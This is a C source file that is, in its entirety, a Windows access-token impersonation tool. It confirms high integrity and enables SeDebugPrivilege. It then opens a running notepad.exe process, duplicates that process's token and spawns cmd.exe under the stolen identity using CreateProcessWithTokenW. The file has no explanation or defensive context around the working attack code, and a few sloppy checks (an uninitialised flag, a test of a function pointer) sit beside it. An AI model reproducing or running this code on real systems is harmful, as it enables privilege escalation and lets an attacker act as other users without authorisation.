# include <stdio.h>
# include <windows.h>
# include <securitybaseapi.h>
# include <psapi.h>
# include <processthreadsapi.h>
# include <Tlhelp32.h>
# include <winnt.h>
# include <sddl.h>
# include <wchar.h>


void ErrorMessagess(DWORD status){
    char buffer[256];
    FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,NULL,status,MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),buffer,sizeof(buffer)/sizeof(char),NULL);
    printf("[+] Error is %s \n", buffer);
}


void CheckIntegrityLevel(){

        LPVOID  TokenInformation;
        DWORD TokenInformationLength=1000;
        DWORD TokenReturnLength;
        TOKEN_MANDATORY_LABEL *ptml;
        ptml=(TOKEN_MANDATORY_LABEL*)malloc(1000);
        PSID sid;
        wchar_t StringSid;

        BOOL value_gettokeLen=GetTokenInformation(GetCurrentProcessToken(),TokenIntegrityLevel,ptml,TokenInformationLength,(DWORD *)&TokenReturnLength);
        if(value_gettokeLen){
            if(TokenInformationLength > TokenReturnLength){
               sid=ptml->Label.Sid;
               DWORD integrityLevel=*GetSidSubAuthority(sid,*GetSidSubAuthorityCount(sid)-1);
                if (integrityLevel >= SECURITY_MANDATORY_HIGH_RID) {
                    printf("[+] Process Running in High integrity\n");
                }
                 else {
                    printf("[!] Process Not Running in High Integrity\n");
                    exit(0);
                }
            }
            else{
                printf("[!] Please Increase value of TokenInformationLength\n");
                exit(0);
            }    
            
        }

}

DWORD FindTargetProc( const char *targetprocess){

    HANDLE prcs;
    int flag;
    PROCESSENTRY32 pe32;
    DWORD pid=0;
    prcs=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if(prcs==INVALID_HANDLE_VALUE){
        printf("[!] Error Occured while Taking Snapshot of the process\n");
        DWORD dwStatusError=GetLastError();
        ErrorMessagess(dwStatusError);
        exit(0);
    }
    else{
          pe32.dwSize=sizeof(PROCESSENTRY32);
          //retrieving info about the first process
          BOOL values=Process32First(prcs,(LPPROCESSENTRY32)&pe32);
          if(values==FALSE){
            printf("[!] Error Occured while Copying the First Process to buffer\n");
            DWORD dwStatusError=GetLastError();
            ErrorMessagess(dwStatusError);
            exit(0);
          }

          else{
             while(Process32Next(prcs,(LPPROCESSENTRY32)&pe32)){
                int cmp=strcasecmp(targetprocess,pe32.szExeFile);
                if(cmp==0){
                    printf("[+] Process found\n");
                    pid=pe32.th32ProcessID;
                    flag=1;
                    break;
                }

             }
             if(flag !=1){
                printf("[!] Could not find the process\n");
                exit(0);
             }
          }

    }
    return pid;
}



int main(){
    CheckIntegrityLevel();
    HANDLE targetProcess;
    HANDLE TokenHandle;
    DWORD processID;
    HANDLE ImpersonatedToken;
    PROCESS_INFORMATION lpProcessInformation;
    LPCWSTR lpApplicationName=L"C:\\Windows\\System32\\cmd.exe";
    STARTUPINFOW lpStartupInfo;
    ZeroMemory(&lpStartupInfo,sizeof(lpStartupInfo));
    ZeroMemory(&lpProcessInformation,sizeof(lpProcessInformation));
    lpStartupInfo.cb=sizeof(lpStartupInfo);
    LUID lpluid;
    HANDLE CurrentProcessHandle;
    LPCSTR lpSystemName="SeDebugPrivilege";
    TOKEN_PRIVILEGES tp;
    BOOL value_currentProcessToken=OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY ,&CurrentProcessHandle);
    BOOL value_LookupPrivilege=LookupPrivilegeValueA(NULL,SE_DEBUG_NAME ,&lpluid);
    tp.PrivilegeCount=1;
    tp.Privileges[0].Luid=lpluid;
    tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
    if(value_LookupPrivilege){
        if(value_currentProcessToken){
            if(AdjustTokenPrivileges(CurrentProcessHandle,FALSE,&tp,sizeof(tp),NULL,NULL)){
                printf("[+] SeDebug Privilege Enabled Successfully\n");
                processID=FindTargetProc("notepad.exe");
                targetProcess=OpenProcess(PROCESS_VM_READ|PROCESS_ALL_ACCESS,TRUE,processID);
                if(targetProcess==NULL){
                   printf("[!] Could not get handle to Target Process\n");
                   DWORD dwStatusError=GetLastError();
                   ErrorMessagess(dwStatusError);
                   exit(0);
                }
            }
            else{
                printf("[!] Error in Enabling SeDebug Privilege\n");
                exit(0);
            }
        }
        else
        {
        printf("[!] Error in Enabling SeDebug Privilege\n");
        DWORD dwStatusError=GetLastError();
        ErrorMessagess(dwStatusError);
        exit(0);
        
        }
    }
    else{
        printf("[!] Error in Enabling SeDebug Privilege\n");
        DWORD dwStatusError=GetLastError();
        ErrorMessagess(dwStatusError);
        exit(0);

    }

    if(FindTargetProc){
        if(OpenProcessToken(targetProcess,TOKEN_DUPLICATE,&TokenHandle)){
            printf("[+] Obtained handle to Targt Process\n");
            if(DuplicateTokenEx(TokenHandle,MAXIMUM_ALLOWED,NULL,SecurityImpersonation,TokenPrimary,&ImpersonatedToken)){
                printf("[+] Token Impersonation Successfull\n");
                if(CreateProcessWithTokenW(ImpersonatedToken,LOGON_WITH_PROFILE,lpApplicationName,NULL,NORMAL_PRIORITY_CLASS,NULL,NULL,&lpStartupInfo,&lpProcessInformation)){
                    printf("[+] CMD created as Target User\n");
                }
                else{
                    printf("[!] Process not created\n");
                    DWORD dwStatusError=GetLastError();
                    ErrorMessagess(dwStatusError);
                    exit(0);
                }

            }
            else{
                printf("[+]no duplicate token obtained\n");
                DWORD dwStatusError=GetLastError();
                ErrorMessagess(dwStatusError);
                exit(0);
            }

        }
        else{
            printf("[!] Token Not Obtained..\n");
            DWORD dwStatusError=GetLastError();
            ErrorMessagess(dwStatusError);
            exit(0);
        }





    }
    
    
}
